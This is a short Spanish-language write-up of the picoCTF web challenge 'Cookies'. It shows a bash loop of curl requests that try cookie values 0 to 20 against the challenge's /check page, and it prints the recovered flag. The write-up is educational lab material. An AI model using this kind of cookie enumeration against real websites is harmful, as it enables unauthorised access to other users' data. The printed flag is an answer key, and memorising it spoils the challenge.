## **Descripción**
Who doesn't love cookies? Try to figure out the best one. [http://mercury.picoctf.net:17781/](http://mercury.picoctf.net:17781/)
## **Hints**

## **Solución** 
Para este reto haremos lo siguiente:
-  Nos vamos al link que nos dan, lo primero que hacemos es inspeccionar la pagina en busca de alguna pista.
- Este sitio web tiene un botón que puedes presionar para buscar una cookie.
- La página web http://mercury.picoctf.net:port/check identifica cada galleta con números sucesivos y genera mensajes basados ​​en el número (almacenado en la cookie web) enviado
- Por lo tanto, modificando el nombre de la cookie, sería posible recuperar todos los mensajes personalizados, y quizás también la bandera.
- Para ello haremos un script en bash con un for para generar cookies del 0 al 20 y de esta manera obtener la bandera.
- Con esto obtenemos la siguiente bandera

```
┌──(kali㉿kali)-[~/Documents/COMPETICION PICOCTF/GENERAL SKILLS]
└─$ for i in {0..20};do curl -s http://mercury.picoctf.net:17781/check -H "Cookie: name = $i"; done |grep pico 
  <p style="text-align:center; font-size:30px;"><b>Flag</b>: <code>picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}</code></p>

picoCTF{3v3ry1_l0v3s_c00k135_bb3b3535}

```

## **Notas adicionales**

## **Referencias**
